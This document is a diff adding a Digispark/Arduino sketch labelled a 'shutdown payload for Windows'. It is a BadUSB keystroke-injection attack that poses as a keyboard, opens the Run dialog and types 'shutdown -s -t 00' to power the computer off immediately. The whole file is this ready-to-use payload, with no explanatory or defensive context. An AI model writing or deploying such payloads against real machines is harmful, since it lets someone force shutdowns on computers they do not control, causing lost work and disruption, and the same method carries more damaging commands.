@@ -1,0 +1,16 @@
+Fastest shutdown payload for Windows
+
+(Runs only once)
+
+  #include "DigiKeyboard.h"
+  void setup() {
+    DigiKeyboard.sendKeyStroke(0);
+    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+    DigiKeyboard.delay(150);
+    DigiKeyboard.print("shutdown -s -t 00");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  }
+
+  void loop() {
+    //empty
+  }
